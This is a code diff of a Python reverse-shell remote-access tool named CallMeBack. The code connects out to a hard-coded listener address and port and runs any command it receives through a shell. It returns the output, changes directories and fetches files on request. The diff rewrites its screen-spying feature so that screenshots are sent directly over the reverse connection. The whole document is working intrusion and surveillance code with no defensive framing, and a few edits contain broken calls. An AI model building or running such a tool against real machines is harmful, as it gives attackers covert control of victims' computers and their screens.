@@ -14,11 +14,7 @@ import numpy as np
 from flask import Flask, Response
 from flask_socketio import SocketIO, emit
 import pyautogui
-     
-
-from PyInstaller.utils.hooks import collect_data_files
-datas = collect_data_files('flask_socketio','Flask',' Response','pyautogui')
-app =''
+import timeit,time
 LHOST = '10.195.100.240' # add ip address listner
 LPORT = int(7777) # add port
 hostname = socket.gethostname()
@@ -29,43 +25,38 @@ class CallMeBack:
     def __init__(self):
         global Stopthread
         self.__Socket_SockClinet()
-
-    def StreamChannel(self):            
-
-        app = Flask(__name__)
-        socketio = SocketIO(app)
-        log = logging.basicConfig(filename=os.environ["appdata"]+'\\'+'server.log', level=logging.INFO, format='%(asctime)s - %(message)s')
-        def generate_frames():
-           while True:
-                screen = capture_screen()
+    def StreamChannel(self):
+        global Stopthread
+        StimeStart = timeit.default_timer()
+        try:
+            while True:
+                screenshot = pyautogui.screenshot()
+                frame = np.array(screenshot)
+                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+                screen = frame
                 ret, buffer = cv2.imencode('.jpg', screen)
                 frame = buffer.tobytes()
-                if Stopthread == 1 :
-                   break
-                yield (b'--frame\r\n'
-                    b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-        def capture_screen():
-            screenshot = pyautogui.screenshot()
-            frame = np.array(screenshot)
-            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
-            return frame
-        @app.route('/')
-        def index():                      
-            return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
-        if __name__=='__main__':
-            socketio.run(app,host='0.0.0.0',port=int(f'{Port}'),debug=False)
-            sys.stdout = sys.stdout.flush()
+                StimeConut = timeit.default_timer()
+                sec = StimeConut -  StimeStart
+                fix_time = time.gmtime(sec)
+                StreamTime = str(time.strftime("%H:%M:%S",fix_time)).split(':')
+                if StreamTime[2] == '30':
+                    break
+                self.SendBack.sendall((str(len(frame))).encode().ljust(16) + frame)
+        finally:
+            pass       
     def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
        
         global Stopthread       
         SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.SendBack = SendBack
         SendBack.connect((LHOST,LPORT))
         path = os.getcwd()+ ' > '
         SendBack.sendall(bytes(path.encode()))     
         while True :
             data = SendBack.recv(4096).decode('latin-1')
             if not data:
-                exit()
+                SendBack.cloes()
             try:
                 Data = subprocess.run(data,shell=True,capture_output=True)
                 if 'The system cannot find the path specified' in str(Data):
@@ -75,7 +66,7 @@ class CallMeBack:
                 else:                     
                     path = os.getcwd()+ ' > '  
                 if 'quit' in data:
-                    exit()
+                    SendBack.close()
                 elif 'cd' in data:
                    try:
                         os.chdir(str(" ".join(data.split()[1:])))
@@ -101,17 +92,9 @@ class CallMeBack:
                         SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(respones.encode()))
                         SendBack.sendall(bytes(path.encode()))          
                 elif 'stream' in data:
-                    Link = 'http://'+f'{IPaddress}'+':'+str(Port)
-                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(Link.encode()+'\n'.encode('latin-1')))
-                    SendBack.sendall(bytes(path.encode()))
-                    thread = threading.Thread(target=self.StreamChannel)
-                    thread.start()
+                    thread = threading.Thread(target=self.StreamChannel)                  
+                    thread.start()              
                     continue
-                elif 'kill' in data:
-                    Stopthread = 1              
-                    StreamStop = 'Stream is End\n'.encode('latin-1')  
-                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(StreamStop))
-                    SendBack.sendall(bytes(path.encode()))
                 elif 'gitfile' in data :
                     data = data.split()
                     try:
@@ -143,9 +126,10 @@ class CallMeBack:
                      Data =bytes(Data.stdout.decode('latin-1').encode())
                      SendBack.sendall(Data)
                      SendBack.sendall(bytes(path.encode()))
+                        
             except Exception :
                continue 
-
+        
 
 if __name__=='__main__':
      CallMeBack()
